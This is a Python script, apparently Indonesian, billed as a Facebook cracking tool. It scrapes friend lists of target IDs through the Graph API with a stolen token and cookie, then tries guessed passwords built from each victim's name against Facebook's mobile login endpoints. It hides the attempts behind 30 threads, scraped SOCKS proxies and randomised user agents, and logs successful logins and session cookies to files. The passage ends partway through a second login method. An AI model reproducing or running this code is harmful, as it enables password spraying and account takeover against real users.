# import module
import os
try:
  import rich
except ImportError:
  print('\t• Sedang Menginstall Modul Rich •')
  os.system('pip install rich')
try:
  import stdiomask
except ImportError:
  print('\t• Sedang Menginstall Modul Stdiomask •')
  os.system('pip install stdiomask')
try:
  import requests
except ImportError:
	print('\t• Sedang Menginstall Modul Requests •')
	os.system('pip install requests && pip install mechanize ')

import requests,bs4,json,sys,random,datetime,time,re,rich,base64
from time import time as mek
from concurrent.futures import ThreadPoolExecutor as tred

from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as sop

from rich import pretty
from rich import print as gubluk
from rich.console import Console
from rich.panel import Panel as pan
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

# indikasi
pretty.install()
appNdyZ=[]
cekpoNdyzIn=[]
opsi=[]
console = Console()
ses=requests.Session()

id,id2,loop,ok,cp,akun,tokenme,uid,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[]
ugen,ndy,ualu,ualuh=[],[],[],[]

sys.stdout.write('\x1b]2; Crack Facebook by NdyZz \x07')

def back():
	login()

# color
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x_d = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
clrRa = random.choice([m,k,h,u,b])

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(f' {m}[+] No Internet');exit()
prox=open('.prox.txt','r').read().splitlines()

# Convert Date
day = datetime.datetime.now().strftime("%d-%b-%Y")
mon = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = mon[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okNdyZ = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpNdyZ = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# UBAH UA
for x_p in range(20000):
  uas = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; TFX712G Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Condor;FBBD/Condor;FBDV/TFX712G;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]"

for x_x in range(20000):
  android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
  fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
  fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
  build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
  merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
  fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
  fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
  fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
  merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
  large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')
  dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
  ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
  ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
  ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
  
for x_u in range(10000):
    rr = random.randint
    rc = random.choice
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    g2 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2012K11AG Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X5514D Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Meizu C10 Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    UaMainn = random.choice([u1, u2, u3, u4, u5])
    ugen.append(UaMainn)

for x_c in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,111)
	d=random.randrange(4200,5563)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

# Banner
def banner():
  gubluk(panel(f"""[bold purple]
 __    _            ______                  [bold cyan]Author      : [bold green]NdyZz[bold purple]
|  \  | |    _ __  |___  |____              [bold cyan]Github      : [bold green]https://github.com/NdyZz[bold purple]
|   \ | | __| |\ \/ / / /___  |             [bold cyan]WhatsApp    : [bold green]6285346923840[bold purple]
| |\ \| |/    | \  / / /   / /              [bold cyan]Update      : [bold green]8-Jun-2023[bold purple]
| | \   | (_| |_/ / / /___/ /___            [bold cyan]Status      : [bold yellow]Repair[bold purple]
|_|  \__|\____|__/ /_____|_____|            [bold cyan]Version     : [bold green]0.0.1[bold white]
        """,width=100,padding=(0,6),title=f"[bold green]Banner-NdyZz",style=f"bold purple"))

# dump publik
def Ndy_FromFr_dump():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	gubluk(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=100,padding=(0,8),style='bold purple'))
	id.clear()
	pil = input(f' ╰─  Masukkan ID Target : ')
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenme[0],cookies={'cookie': kukis}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f' [+] Total ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{m} [+] Tidak ada Internet')
		exit()
	except (KeyError,IOError):
		print(f' {m}[+] Pertemanan Tidak Publik Atau Coki dan Token Anda Busuk')
		exit()

# dump massal
def Ndy_FromMs_dump():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		gubluk(panel('[bold white]Ketik [bold green]me[/] Jika Ingin Crack Pertemanan Sendiri',width=100,padding=(0,8),title=f"[bold green]Crack Massal",style=f"bold purple"))
		id.clear()
		jum = int(input(f' ╰─ Berapa Idz Target  : '))
	except ValueError:
		print(' [+] Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f'{h} [+] Pertemanan Tidak Publik')
		exit()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' ╰─ Idz Target Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenme[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' [+] Unstable Signal')
			exit()
	try:
		print(f' [+] Total Idz Target : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'')
		print(' [+] Unstable Signal')
		exit()
	except (KeyError,IOError):
		print(f' [+] {k} Friendship Not Public ')
		time.sleep(3)
		exit()

# dump file
def Ndy_FromFl_dump():
	try:vin = os.listdir('DUMP-NdyZz')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('>> Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP-NdyZz/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x_d} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(P+'['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x_d)
				print(f'>> %s. %s ({h} %s {x_d}idz) '%(cih,isi,len(hem)))
		id.clear()
		geeh = input('\n>> opsi : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener {x_d}')
			time.sleep(3)
			back()
		try:lin = open('DUMP-NdyZz/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
		  id.append(xid)
		setting()

# set metod
def setting():
	print('')
	gubluk(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Id Old ( [bold red]Not Recommended[bold white] )[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Id New ( [bold yellow]Recommended[bold white] )[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Id Random ( [bold green]Very Recommended[bold white] )[/]',width=48,padding=(0,2),title=f"[bold green]Set Urutan Id",style=f"bold purple"))
	hu = input(f' ╰─  Urutan Idz : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bussett in sorted(id):
			muda.append(bussett)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bussett in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bussett)
	else:
		print(' [+] Pilih Yang Bener ')
		exit()
	gubluk(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login [bold green]m.facebook.com[bold white] ( [bold yellow]Validate[bold white] )[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login [bold green]mbasic.facebook.com[bold white] ( [bold yellow]Validate[bold white] )[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login [bold green]free.facebook.com[bold white] ( [bold yellow]Validate[bold white] )[/]\n[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login [bold green]m.facebook.com[bold white] ( [bold yellow]Async[bold white] )[/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login [bold green]m.facebook.com[bold white] ( [bold yellow]Reguler[bold white] )[/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login [bold green]free.facebook.com[bold white] ( [bold yellow]Reguler[bold white] )[/]\n[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login [bold green]graph.facebook.com[bold white] ( [bold yellow]Api[bold white] )[/]\n[bold white][[bold cyan]00[/][bold white]][/] [bold white]Login [bold green]Random[bold white] ( [bold red]Not Recommended[bold white] )[/]',width=70,padding=(0,2),title=f"[bold green]Set method",style=f"bold purple"))
	hc = input(f' ╰─  opsi method : ')
	if hc in ['1','01']:
		method.append('metodV1')
	elif hc in ['2','02']:
		method.append('metodV2')
	elif hc in ['3','03']:
		method.append('metodV3')
	elif hc in ['4','04']:
		method.append('metodV4')
	elif hc in ['5','05']:
		method.append('metodV5')
	elif hc in ['6','06']:
		method.append('metodV6')
	elif hc in ['7','07']:
		method.append('metodV7')
	elif hc in ['0','00']:
	  metodER = random.choice(['metodV1','metodV2','metodV3','metodV4','metodV5','metodV6','metodV7'])
	  method.append(metodER)
	else:
	  method.append('metodV1')
		
	gubluk(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Password Default ( [bold green]Very Recommended[bold white] )\n[bold white][[bold cyan]02[bold white]] [bold white]Password Manual ( [bold red]Not Recommended [bold white])[/][/]''',style='bold purple',title='[bold green]Set Password',padding=(0,2),width=48))
	pwplus=input(f' ╰─  opsi password : ')
	if pwplus in ['02','2']:
		pwpluss.append('ya')
		pwku=input(f' ╰─  password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	
	gubluk(panel(f'[bold white]Tampilkan Aplikasi ? Y/T',width=40,padding=(0,2),title=f"[bold green]Cek Apk",style=f"bold purple"))
	NdyZ_ = input(' ╰─  opsi : ')
	if NdyZ_ in ['']:
		print(' [+] Pilih Yang Bener ')
		exit()
	elif NdyZ_ in ['y','Y']:
		appNdyZ.append('ya')
	else:
		appNdyZ.append('no')
		
	gubluk(panel(f'[bold white]Tampilkan Opsi Checkpoint ? Y/T[/]',width=40,padding=(0,2),title=f"[bold green]Cek Checkpoint",style=f"bold purple"))
	NdyZ_ = input(' ╰─  opsi : ')
	if NdyZ_ in ['']:
		print(' ╰─  Pilih Yang Bener ')
		exit()
	elif NdyZ_ in ['y','Y']:
		cekpoNdyzIn.append('ya')
	else:
		cekpoNdyzIn.append('no')
	
	gubluk(panel(f'[bold white]User-Agent Manual ? Y/T[/]',width=40,padding=(0,2),title=f"[bold green]Set User-Agent",style=f"bold purple"))
	uatambah = input(f' ╰─  opsi : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' ╰─  Masukkan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
	
# password
def passwrd():
	global prog,des
	print('')
	gubluk(panel(f"[bold purple]OK SAVE IN : {okNdyZ}[bold white]",width=50,style=f"bold purple"))
	gubluk(panel(f"[bold yellow]CP SAVE IN : {cpNdyZ}[bold white]",width=50,style=f"bold yellow"))
	gubluk(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 200 Id Agar Terhindar Dari Spam Ip',width=100,padding=(0,8),title=f"[bold green]Info",style=f"bold purple"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yandex in id2:
				idf,nmf = yandex.split('|')[0],yandex.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'2')
						pwv.append(frs+'3')
						pwv.append(frs+'00')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'321')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'654321')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
						pwv.append(frs+xpwd)
				else:pass
				if 'metodV1' in method:
					pool.submit(metodV1,idf,pwv)
				elif 'metodV2' in method:
					pool.submit(metodV2,idf,pwv)
				elif 'metodV3' in method:
					pool.submit(metodV3,idf,pwv)
				elif 'metodV4' in method:
					pool.submit(metodV4,idf,pwv)
				elif 'metodV5' in method:
					pool.submit(metodV5,idf,pwv)
				elif 'metodV6' in method:
					pool.submit(metodV6,idf,pwv)
				elif 'metodV7' in method:
					pool.submit(metodV7,idf,pwv)
				else:
					pool.submit(metodV1,idf,pwv)
		print('')
	print(f'  Crack Selesai, Semoga Dosa Kalian di Ampuni')
	gubluk(panel(f' [bold purple] [+] OK : {ok} ',width=50,style=f"bold purple"))
	gubluk(panel(f' [bold yellow] [+] CP : {cp} ',width=50,style=f"bold yellow"))

# Method m validate
def metodV1(idf,pwv):
  global loop,ok,cp
  ua = random.choice(ugen)
  ses = requests.Session()
  prog.update(des,description=f"[bold purple]Sabar Sayang[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold yellow]{cp}[/]")
  prog.advance(des)
  for pw in pwv:
    try:
      if 'ya' in ualuh: ua = ualu[0]
      nip=random.choice(prox)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({
        'Host': 'm.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua-mobile': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
      })
      p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
      data={
        "lsd":re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
        "jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
        "uid":idf,
        "next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=630498417018811&kid_directed_site=0&app_id=630498417018811&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
        "flow":"login_no_pin","pass":pw,
      }
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      header={
        'Host': 'm.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://m.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'XMLHttpRequest',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
      }
      po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,cookies={'cookie': koki},headers=header,allow_redirects=True,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        if 'no' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'ya' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
          break
      elif "c_user" in ses.cookies.get_dict().keys():
        if 'no' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          break
        elif 'ya' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          cek_apk(kuki)
          break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1
	    
# Method mbasic validate
def metodV2(idf,pwv):
  global loop,ok,cp
  ua = random.choice(ugen)
  ses = requests.Session()
  prog.update(des,description=f"[bold purple]Sabar Sayang[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold yellow]{cp}[/]")
  prog.advance(des) 
  for pw in pwv:
    try:
      if 'ya' in ualuh: ua = ualu[0]
      nip=random.choice(prox)
      proxs= {'http': 'socks5://'+nip}
      ses.headers.update({
        'Host': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua-mobile': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
      })
      p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
      data={
        "lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
        "jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
        "uid":idf,
        "next":"https://developers.facebook.com/tools/debug/accesstoken/",
        "flow":"login_no_pin",
        "pass":pw,
      }
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      header={
        'Host': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://m.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
